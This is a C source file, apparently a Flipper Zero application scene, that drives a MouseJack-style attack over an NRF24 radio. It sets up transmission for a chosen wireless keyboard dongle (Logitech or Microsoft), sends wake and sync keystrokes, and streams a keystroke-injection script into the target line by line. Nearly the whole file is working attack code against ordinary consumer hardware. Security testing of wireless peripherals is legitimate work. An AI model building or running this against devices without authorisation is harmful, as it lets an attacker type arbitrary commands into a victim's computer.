#include "../nrf24_app.h"
#include "../nrf24_hw.h"
#include "../helpers/nrf24_mj_core.h"
#include "../helpers/nrf24_mj_ducky.h"

#include <furi.h>
#include <string.h>

#define TAG "Nrf24MjAttack"

typedef struct {
    Nrf24App* app;
    FuriThread* worker;
    volatile bool stop;
    MjScript* script;
} Nrf24MjAttackCtx;

static Nrf24MjAttackCtx* g_ctx = NULL;

static int32_t mj_attack_worker(void* context) {
    Nrf24MjAttackCtx* ctx = context;
    Nrf24App* app = ctx->app;

    if(app->mj_selected_target < 0 || app->mj_selected_target >= (int8_t)app->mj_target_count) {
        with_view_model(
            app->mj_attack_view,
            Nrf24MjAttackModel * model,
            {
                model->phase = MjAttackPhaseError;
                strncpy(
                    model->error_text,
                    "No target selected",
                    sizeof(model->error_text) - 1);
            },
            true);
        return 0;
    }

    const MjTarget* target = &app->mj_targets[app->mj_selected_target];

    nrf24_hw_init();

    nrf24_hw_acquire();
    bool ok = nrf24_hw_probe();
    nrf24_hw_release();

    if(!ok) {
        with_view_model(
            app->mj_attack_view, Nrf24MjAttackModel * model, { model->hardware_ok = false; }, true);
        FURI_LOG_W(TAG, "NRF24 probe failed");
        nrf24_hw_deinit();
        return 0;
    }

    /* Open script (uses storage handle from app). */
    const char* path = furi_string_get_cstr(app->mj_script_path);
    ctx->script = mj_script_open(app->storage, path);
    if(!ctx->script) {
        with_view_model(
            app->mj_attack_view,
            Nrf24MjAttackModel * model,
            {
                model->phase = MjAttackPhaseError;
                strncpy(
                    model->error_text, "Cannot open script", sizeof(model->error_text) - 1);
            },
            true);
        nrf24_hw_deinit();
        return 0;
    }

    /* Update model with script info. */
    char target_label[24];
    mj_format_target(target, target_label, sizeof(target_label));
    with_view_model(
        app->mj_attack_view,
        Nrf24MjAttackModel * model,
        {
            model->phase = MjAttackPhaseRunning;
            model->hardware_ok = true;
            strncpy(model->target_label, target_label, sizeof(model->target_label) - 1);
            model->target_label[sizeof(model->target_label) - 1] = '\0';
            strncpy(
                model->script_name, ctx->script->file_name, sizeof(model->script_name) - 1);
            model->script_name[sizeof(model->script_name) - 1] = '\0';
            model->line_total = ctx->script->total_lines;
            model->line_cur = 0;
        },
        true);

    /* Acquire SPI for the whole attack — radio access alone, no LCD writes are
     * needed inside this hot path (the view model updates go through the
     * GUI thread). The acquire stays in the same thread, so re-acquire is
     * safe across multiple bursts. */

    /* Setup radio */
    nrf24_hw_acquire();
    mj_setup_tx_for_target(target);
    mj_logitech_wake(target);
    mj_reset_ms_sequence();
    if(target->vendor == MjVendorMicrosoft || target->vendor == MjVendorMsCrypt) {
        for(int i = 0; i < 6 && !ctx->stop; i++) {
            mj_inject_keystroke(target, 0, 0);
            furi_delay_ms(2);
        }
    }
    nrf24_hw_release();

    /* Stream script line-by-line. */
    while(!ctx->stop && !mj_script_done(ctx->script)) {
        nrf24_hw_acquire();
        bool more = mj_script_step(ctx->script, target, &ctx->stop);
        nrf24_hw_release();

        with_view_model(
            app->mj_attack_view,
            Nrf24MjAttackModel * model,
            {
                model->line_cur = ctx->script->current_line;
                if(ctx->script->last_warning[0]) {
                    strncpy(
                        model->last_warning,
                        ctx->script->last_warning,
                        sizeof(model->last_warning) - 1);
                    model->last_warning[sizeof(model->last_warning) - 1] = '\0';
                }
            },
            true);

        if(!more) break;
        /* Yield briefly so the GUI gets a chance to redraw. */
        furi_delay_ms(1);
    }

    /* Power down. */
    nrf24_hw_acquire();
    nrf24_hw_tx_stop();
    nrf24_hw_power_down();
    nrf24_hw_release();
    nrf24_hw_deinit();

    if(!ctx->stop) {
        with_view_model(
            app->mj_attack_view,
            Nrf24MjAttackModel * model,
            { model->phase = MjAttackPhaseDone; },
            true);
    }
    return 0;
}

void nrf24_app_scene_mj_attack_on_enter(void* context) {
    Nrf24App* app = context;

    Nrf24MjAttackCtx* ctx = malloc(sizeof(Nrf24MjAttackCtx));
    memset(ctx, 0, sizeof(*ctx));
    ctx->app = app;
    g_ctx = ctx;

    with_view_model(
        app->mj_attack_view,
        Nrf24MjAttackModel * model,
        {
            model->phase = MjAttackPhaseIdle;
            model->hardware_ok = true;
            model->target_label[0] = '\0';
            model->script_name[0] = '\0';
            model->line_cur = 0;
            model->line_total = 0;
            model->last_warning[0] = '\0';
            model->error_text[0] = '\0';
            model->current_channel = 0;
        },
        true);

    view_dispatcher_switch_to_view(app->view_dispatcher, Nrf24ViewMjAttack);

    ctx->worker = furi_thread_alloc_ex("Nrf24MjAttack", 4096, mj_attack_worker, ctx);
    furi_thread_start(ctx->worker);
}

bool nrf24_app_scene_mj_attack_on_event(void* context, SceneManagerEvent event) {
    UNUSED(context);
    if(event.type != SceneManagerEventTypeCustom || !g_ctx) return false;
    if(event.event == Nrf24MjAttackEventStop) {
        g_ctx->stop = true;
        return true;
    }
    return false;
}

void nrf24_app_scene_mj_attack_on_exit(void* context) {
    UNUSED(context);
    if(!g_ctx) return;
    g_ctx->stop = true;
    furi_thread_join(g_ctx->worker);
    furi_thread_free(g_ctx->worker);
    if(g_ctx->script) mj_script_close(g_ctx->script);
    free(g_ctx);
    g_ctx = NULL;
}
